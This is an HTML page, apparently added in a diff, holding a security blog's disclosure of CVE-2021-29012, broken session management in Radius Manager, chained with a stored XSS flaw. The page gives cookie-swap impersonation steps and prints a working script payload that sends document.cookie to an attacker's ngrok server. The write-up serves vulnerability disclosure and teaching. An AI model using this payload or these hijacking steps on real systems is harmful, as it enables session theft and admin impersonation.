@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        CVE-2021-29012 - Broken Session Management ::
+        1d8 blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="CVE-2021-29012 (Broken Session Management)
+When an admin user logs in, their session cookie is given &amp;amp; doesn&amp;rsquo;t expire upon logging out. Instead the session cookie is temporarily disabled until the admin logs in again. The session cookie doesn&amp;rsquo;t change so if an attacker manages to steal a session cookie, then they can simply reuse it when the admin is logged in again and impersonate them. And if they aren&amp;rsquo;t successful at logging in the first time due to the admin being logged out, they can simply keep trying until the admin is logged in again and get a successful login."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://1d8.github.io/cves/cve_2021_29012/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="https://1d8.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://1d8.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://1d8.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CVE-2021-29012 - Broken Session Management"/>
+<meta name="twitter:description" content="CVE-2021-29012 (Broken Session Management)
+When an admin user logs in, their session cookie is given &amp; doesn&rsquo;t expire upon logging out. Instead the session cookie is temporarily disabled until the admin logs in again. The session cookie doesn&rsquo;t change so if an attacker manages to steal a session cookie, then they can simply reuse it when the admin is logged in again and impersonate them. And if they aren&rsquo;t successful at logging in the first time due to the admin being logged out, they can simply keep trying until the admin is logged in again and get a successful login."/>
+
+
+
+<meta property="og:title" content="CVE-2021-29012 - Broken Session Management" />
+<meta property="og:description" content="CVE-2021-29012 (Broken Session Management)
+When an admin user logs in, their session cookie is given &amp; doesn&rsquo;t expire upon logging out. Instead the session cookie is temporarily disabled until the admin logs in again. The session cookie doesn&rsquo;t change so if an attacker manages to steal a session cookie, then they can simply reuse it when the admin is logged in again and impersonate them. And if they aren&rsquo;t successful at logging in the first time due to the admin being logged out, they can simply keep trying until the admin is logged in again and get a successful login." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1d8.github.io/cves/cve_2021_29012/" /><meta property="article:section" content="cves" />
+
+<meta property="og:site_name" content="1d8 blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/cves">CVEs</a></li>
+        
+      
+        
+          <li><a href="/publications">Publications</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/cves">CVEs</a></li>
+      
+    
+      
+        <li><a href="/publications">Publications</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">CVE-2021-29012 - Broken Session Management</h1>
+    <div class="post-meta">
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 4 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>CVE-2021-29012 (Broken Session Management)</p>
+<p>When an admin user logs in, their session cookie is given &amp; doesn&rsquo;t expire upon logging out. Instead the session cookie is temporarily disabled until the admin logs in again. The session cookie doesn&rsquo;t change so if an attacker manages to steal a session cookie, then they can simply reuse it when the admin is logged in again and impersonate them. And if they aren&rsquo;t successful at logging in the first time due to the admin being logged out, they can simply keep trying until the admin is logged in again and get a successful login.</p>
+<p>Successful exploitation requires that you have access to the Radius Management web interface and be able to make requests so you can simply change out the session cookie header when making HTTP requests.</p>
+<p>This vulnerability can be exploited in order to elevate privileges when chained together with CVE-2021-29011 in order to gain the session cookie of another user with elevated privileges.</p>
+<h2 id="demo-videos">
+  Demo Videos
+  <a href="#demo-videos" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>We simply swap an admin&rsquo;s cookie for a low privileged user&rsquo;s cookie and are able to assume the privileges of the admin as shown here:</p>
+<p><a href="https://www.dropbox.com/s/9ootf6udj761bbh/session-impersonation-2021-03-19_23.11.19.mkv?dl=0">Dropbox - session-impersonation-2021-03-19_23.11.19.mkv</a></p>
+<p>The overall process that I went through to exploit this is:</p>
+<ol>
+<li>
+<p>Create an account with no privileges</p>
+</li>
+<li>
+<p>Grab the admin session cookie</p>
+</li>
+<li>
+<p>Make a request that requires privileges such as creating a user using the low privilege account</p>
+</li>
+<li>
+<p>Request is denied due to no privileges</p>
+</li>
+<li>
+<p>Resend the request but this time modify the cookie parameter so that it&rsquo;s replaced with the admin session cookie</p>
+</li>
+<li>
+<p>Request is successful &amp; we can now make requests on behalf of the admin user while the admin user is logged in.</p>
+</li>
+</ol>
+<h1 id="chaining-cves-together">
+  Chaining CVEs Together
+  <a href="#chaining-cves-together" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>This section details chaining together CVE-2021-29012 &amp; CVE-2021-29011 in order to take an admin&rsquo;s session cookie &amp; perform requests on their behalf.</p>
+<p>There are multiple fields that are vulnerable to cross-site scripting but I could only find 1 field (the access point description field) that could fit an entire script for extracting a cookie &amp; sending it off to an attacker for use in session hijacking.</p>
+<h2 id="tools-used">
+  Tools Used:
+  <a href="#tools-used" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<ol>
+<li>Ngrok &amp; Python&rsquo;s simple HTTP server to simulate an attacker&rsquo;s server receiving the session cookie</li>
+</ol>
+<h2 id="proof-of-concept">
+  Proof of Concept
+  <a href="#proof-of-concept" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Once we place our script inside the Access Point&rsquo;s description, anytime a user lists the available access points, we will receive their session cookie on our server &amp; be able to impersonate them.</p>
+<h3 id="cross-site-scripting-xss">
+  Cross Site Scripting (XSS)
+  <a href="#cross-site-scripting-xss" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>We first need to inject our script into an input field so that whenever an admin logs in &amp; lists the available access points, their cookie is sent to us (the attacker in this scenario).</p>
+<p>The script used that will be injected is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://dat.ngrok.io/cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>; 
+<span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">false</span>); <span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">send</span>();<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">responseText</span>);
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>where dat is the subdomain generated by ngrok. And we will be injecting it into the description field when adding/editing an access point.</p>
+<p>After listing the available access points as an admin, this is what an attacker would see:</p>
+<p><img src="https://i.imgur.com/zxLtOXc.png" alt=""></p>
+<p>As you can see, we have everything we need in order to impersonate the admin user and this was achieved just by having them list the available access points. This of course requires that an attacker already have an account registered on the Radius Manager with sufficient privileges to add/edit an access point.</p>
+<h3 id="broken-session-management-exploitation">
+  Broken Session Management Exploitation
+  <a href="#broken-session-management-exploitation" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The next stage of the attack would be abusing the broken session management in order to make requests on someone else&rsquo;s behalf without their interaction. This simply involves intercepting the request exchanging the cookie parameter with the stolen one:</p>
+<ol>
+<li>Make the original request for adding a user from an account with low privileges &amp; you will get a response that looks like this:</li>
+</ol>
+<p><img src="https://i.imgur.com/C21B7PU.png" alt=""></p>
+<ol start="2">
+<li>Now do repeat step 1 &amp; sniff the request out with Firefox&rsquo;s network monitoring tool (inspect element &gt; network):</li>
+</ol>
+<p><img src="https://i.imgur.com/IgyGoQF.png" alt=""></p>
+<ol start="3">
+<li>Right-click the request &amp; hit <em>Edit and Resend</em> &amp; change the <em>Cookie: PHPSESSID</em> value for the stolen cookie &amp; change the <em>login_admin</em> value for the value provided by the stolen session cookie. After doing so &amp; resending the request, now we can make requests as the admin user:</li>
+</ol>
+<p><img src="https://i.imgur.com/sNJxhL7.png" alt=""></p>
+<ul>
+<li><strong>NOTE: This requires the admin to be currently logged in. If the admin is logged out then the session cookie is invalid until they login again. But the session cookie does not change once they log out. It stays the same.</strong></li>
+</ul>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
